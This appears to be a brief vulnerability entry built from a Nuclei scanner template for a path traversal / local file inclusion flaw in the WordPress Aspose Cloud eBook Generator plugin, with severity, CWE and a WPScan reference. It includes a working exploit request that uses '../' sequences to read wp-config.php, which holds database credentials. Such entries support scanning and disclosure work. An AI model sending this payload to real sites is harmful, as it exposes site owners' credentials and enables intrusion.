# Nuclei Template: Wordpress Aspose Cloud eBook Generator - Local File Inclusion
**Template ID:** aspose-file-download
**Vulnerability Class:** Relative Path Traversal
**Severity:** High
**CWE:** CWE-23
**Source:** Nuclei Template (`aspose-file-download.yaml`)

## Vulnerability Information & PoC

## Description
Wordpress Aspose Cloud eBook Generator is vulnerable to local file inclusion.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/aspose-cloud-ebook-generator/aspose_posts_exporter_download.php?file=../../../wp-config.php
```

## References
- https://wpscan.com/vulnerability/7866
